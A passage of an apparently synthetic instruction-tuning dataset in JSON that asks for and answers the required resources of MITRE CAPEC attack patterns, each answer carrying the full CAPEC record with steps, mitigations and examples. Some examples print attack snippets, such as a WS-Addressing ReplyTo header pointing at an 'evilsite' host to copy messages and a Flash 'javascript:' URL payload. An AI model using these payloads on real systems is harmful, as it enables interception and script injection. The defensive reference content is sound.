          "xhtml:p": "By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string. If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that \"does not make sense\". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain. The stolen data may contain sensitive information, such CSRF protection tokens."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "242"
          }
        },
        "Prerequisites": {
          "Prerequisite": "No new lines can be present in the injected CSS stringProper HTML or URL escaping of the \" and ' characters is not presentThe attacker has control of two injection points: pre-string and post-string"
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Ability to craft a CSS injection"
          }
        },
        "Resources_Required": {
          "Resource": "Attacker controlled site/page to render a page referencing the injected CSS string"
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Prior to performing CSS parsing, require the CSS to start with well-formed CSS when it is a cross-domain load and the MIME type is broken. This is a browser level fix.",
            "Implementation: Perform proper HTML encoding and URL escaping"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "707"
            },
            {
              "@CWE_ID": "149"
            },
            {
              "@CWE_ID": "177"
            },
            {
              "@CWE_ID": "838"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-405"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: XML Schema Poisoning (CAPEC ID: 146)",
    "context": "",
    "output": "The resources required to execute XML Schema Poisoning (CAPEC ID: 146) are the following: Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.",
      "@Name": "XML Schema Poisoning (CAPEC ID: 146)",
      "attack_ptrn": {
        "@ID": "146",
        "@Name": "XML Schema Poisoning",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "271"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine if XML schema is local or remote] Because this attack differs slightly if the target uses remote XML schemas versus local schemas, the adversary first needs to determine which of the two are used."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Gain access to XML schema] The adversary gains access to the XML schema so that they can modify the contents.",
              "Technique": [
                "For a local scenario, the adversary needs access to the machine that the schema is located on and needs to gain permissions to alter the contents of the file.",
                "For a remote scenario, the adversary needs to be able to sniff HTTP traffic that contains an XML schema."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Poison XML schema] Once the adversary gains access to the XML schema, they will alter it to achieve a desired effect. Locally, they can simply modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.",
              "Technique": [
                "Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data.",
                "Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.",
                "Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B)."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Some level of access to modify the target schema.",
            "The schema used by the target application must be improperly secured against unauthorized modification and manipulation."
          ]
        },
        "Resources_Required": {
          "Resource": "Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": [
                "Unreliable Execution",
                "Resource Consumption"
              ],
              "Note": "A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Protect the schema against unauthorized modification.",
            "Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification.",
            "Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": [
                "XML Schema Poisoning Attacks can often occur locally due to being embedded within the XML document itself or being located on the host within an improperaly protected file. In these cases, the adversary can simply edit the XML schema without the need for additional privileges. An example of the former can be seen below:",
                "If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "<?xml version=\"1.0\"?> <!DOCTYPE contact [ <!ELEMENT contact (name,phone,email,address)> <!ELEMENT name (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT address (#PCDATA)> ]> <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code>"
              }
            },
            {
              "xhtml:p": [
                "XML Schema Poisoning Attacks can also be executed remotely if the HTTP protocol is being used to transport data. :",
                "The HTTP protocol does not encrypt the traffic it transports, so all communication occurs in plaintext. This traffic can be observed and modified by the adversary during transit to alter the XML schema before it reaches the end user. The adversary can perform a Adversary-in-the-Middle (CAPEC-94) Attack to alter the schema in the same way as the previous example and to acheive the same results."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "<?xml version=\"1.0\"?> <!DOCTYPE contact SYSTEM \"http://example.com/contact.dtd\"[ <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code>"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "15"
            },
            {
              "@CWE_ID": "472"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Eavesdropping (CAPEC ID: 651)",
    "context": "",
    "output": "The resources required to execute Eavesdropping (CAPEC ID: 651) are the following: For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.",
      "@Name": "Eavesdropping (CAPEC ID: 651)",
      "attack_ptrn": {
        "@ID": "651",
        "@Name": "Eavesdropping",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "117"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally."
        },
        "Resources_Required": {
          "Resource": "For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other",
            "Note": "The adversary gains unauthorized access to information."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Be mindful of your surroundings when discussing sensitive information in public areas.",
            "Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.",
            "If possible, physically disable the microphone on your machine if it is not needed."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1111",
            "Entry_Name": "Multi-Factor Authentication Interception"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Client-Server Protocol Manipulation (CAPEC ID: 220)",
    "context": "",
    "output": "required resources:\nThe adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.",
      "@Name": "Client-Server Protocol Manipulation (CAPEC ID: 220)",
      "attack_ptrn": {
        "@ID": "220",
        "@Name": "Client-Server Protocol Manipulation",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions.",
        "Extended_Description": {
          "xhtml:p": "For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "272"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction."
        },
        "Resources_Required": {
          "Resource": "The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "757"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-02-22",
            "Modification_Comment": "Updated Description, Extended_Description"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Poison Web Service Registry (CAPEC ID: 51)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Poison Web Service Registry (CAPEC ID: 51):\nCapability to directly or indirectly modify registry resources",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Capability to directly or indirectly modify registry resources",
      "@Name": "Poison Web Service Registry (CAPEC ID: 51)",
      "attack_ptrn": {
        "@ID": "51",
        "@Name": "Poison Web Service Registry",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.",
        "Extended_Description": {
          "xhtml:p": "WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "203"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.",
              "Technique": [
                "An adversary can perform a denial of service attack on a web service.",
                "An adversary can redirect requests or responses to a malicious service."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.",
              "Technique": [
                "Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.",
                "Create a service that will give malicious responses to a service provider.",
                "Act as a malicious service provider and respond to requests in an arbitrary way."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.",
              "Technique": [
                "Intercept and change WS-Adressing headers to route to a malicious service or service provider.",
                "Provide incorrect information in schema or metadata to cause a denial of service.",
                "Delete information about service procider interfaces to cause a denial of service."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must be able to write to resources or redirect access to the service registry."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To identify and execute against an over-privileged system interface"
          }
        },
        "Resources_Required": {
          "Resource": "Capability to directly or indirectly modify registry resources"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Design: Harden registry server and file access permissions",
            "Implementation: Implement communications to and from the registry using secure protocols"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime.",
              "In this example \"evilsite\" is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "informative",
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "xhtml:div": [
                  {
                    "@style": "margin-left:1em;",
                    "#text": "http://example.com/Message"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "#text": "<wsa:Address>http://valid.example/validClient</wsa:Address>"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "#text": "<wsa:Address>http://evilsite/evilClient</wsa:Address>"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "#text": "<wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address>"
                  }
                ],
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "#text": "<wsa:MessageID>\n                     </wsa:MessageID><wsa:ReplyTo>\n                     </wsa:ReplyTo><wsa:ReplyTo>\n                     </wsa:ReplyTo><wsa:FaultTo>\n                     </wsa:FaultTo>"
              },
              "xhtml:br": null,
              "#text": "<S:Header>\n                  </S:Header>"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Using Alternative IP Address Encodings (CAPEC ID: 4), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities.",
      "@Name": "Using Alternative IP Address Encodings (CAPEC ID: 4)",
      "attack_ptrn": {
        "@ID": "4",
        "@Name": "Using Alternative IP Address Encodings",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack relies on the adversary using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "267"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for IP addresses as user input] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application where IP addresses are used.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.",
                "Manually inspect the application to find entry points."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and attempts alternate IP address encodings, observing application behavior. The adversary will also attempt to access the application through an alternate IP address encoding to see if access control changes",
              "Technique": [
                "Instead of using a URL, use the IP address that the URL resolves to",
                "Specify a port directly to a URL input",
                "Omit or add \"http://\" or \"https://\" to a URL to see if the application behaves differently"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Bypass access control] Using an alternate IP address encoding, the adversary will either access the application or give the alternate encoding as input, bypassing access control restrictions."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target software must fail to anticipate all of the possible valid encodings of an IP/web address.",
            "The adversary must have the ability to communicate with the server."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary has only to try IP address format combinations."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Default deny access control policies",
            "Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses, this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "291"
            },
            {
              "@CWE_ID": "173"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Flash Parameter Injection (CAPEC ID: 174)",
    "context": "",
    "output": "The resources required to execute Flash Parameter Injection (CAPEC ID: 174) are the following: The adversary must convince the victim to click their crafted link.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must convince the victim to click their crafted link.",
      "@Name": "Flash Parameter Injection (CAPEC ID: 174)",
      "attack_ptrn": {
        "@ID": "174",
        "@Name": "Flash Parameter Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document.",
        "Extended_Description": {
          "xhtml:p": [
            "These 'FlashVars' are most often passed to the Flash file via URL arguments or from the Object or Embed tag within the embedding HTML document. If these FlashVars are not properly sanitized, an adversary may be able to embed malicious content (such as scripts) into the HTML document.",
            "The injected parameters can also provide the adversary control over other objects within the Flash file as well as full control over the parent document's DOM model. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. Flash Parameter Injection attacks can also preface further attacks such as various forms of Cross-Site Scripting (XSS) attacks in addition to Session Hijacking attacks."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "182",
              "Exclude_Related": {
                "@Exclude_ID": "403"
              }
            },
            {
              "@Nature": "CanAlsoBe",
              "@CAPEC_ID": "460"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "178"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, they list how to pass global parameters to the Flash file from the embedding object.",
              "Technique": [
                "Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.",
                "Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.",
              "Technique": [
                "When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.",
                "When the name of the Flash file is exposed as a form or a URL parameter, the adversary injects '?' and the payload after the file name in the URL to override some global value.",
                "When the arguments passed in the 'flashvars' attributes, the adversary injects '&' and payload in the URL.",
                "If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.",
                "If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.",
              "Technique": "Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document."
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The adversary needs to be smart enough to convince the victim to click on their crafted link."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must convince the victim to click their crafted link."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other",
              "Note": "Information Leakage"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "User input must be sanitized according to context before reflected back to the user. The JavaScript function 'encodeURI' is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled, changing the name of the local shared objects (Flash cookies)."
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "The following are examples for different types of parameters passed to the Flash file.",
              "If an unsuspecting user is lured by an adversary to click on link like this: http://example.com/vulnerable.swf?flashfile=javascript:alert(document.domain)",
